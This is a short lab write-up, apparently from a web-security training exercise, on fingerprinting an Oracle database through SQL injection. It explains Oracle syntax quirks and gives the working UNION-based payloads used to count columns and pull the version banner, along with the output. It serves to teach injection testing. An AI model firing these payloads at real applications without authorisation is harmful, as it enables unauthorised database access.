### Lab: Querying the Database Type and Version on Oracle

```markdown
# Lab: SQL Injection (Oracle Version Fingerprinting)

| **Category** | Web Security / SQL Injection |
| :--- | :--- |
| **Vulnerability Type** | SQL Injection |
| **Database** | Oracle |
| **Goal** | Identify the database type and version. |
| **Status** | ✅ Solved |

---

## Conceptual Overview
Different databases have different syntax for queries and different internal tables for system information.
**Oracle Database Quirks:**
1.  **Mandatory FROM Clause:** You cannot execute `SELECT 'a'`. You must execute `SELECT 'a' FROM dual`. (`dual` is a dummy table in Oracle).
2.  **Version Table:** Version info is located in `v$version` (column `banner`).

---

## Phase 1: Analysis

1.  **Column Count:** Confirmed **2 Columns** using `UNION SELECT NULL, NULL FROM dual--`.
2.  **Database Identification:** The requirement to use `FROM dual` strongly indicated an Oracle database.

---

## ⚔️ Phase 2: Exploitation

I crafted a payload to pull the version banner into the first valid text column.

### The Payload:
```sql
' UNION SELECT banner, NULL FROM v$version--
```
## Execution Result:
The application displayed:

Oracle Database 11g Enterprise Edition Release 11.2.0.2.0 - 64bit Production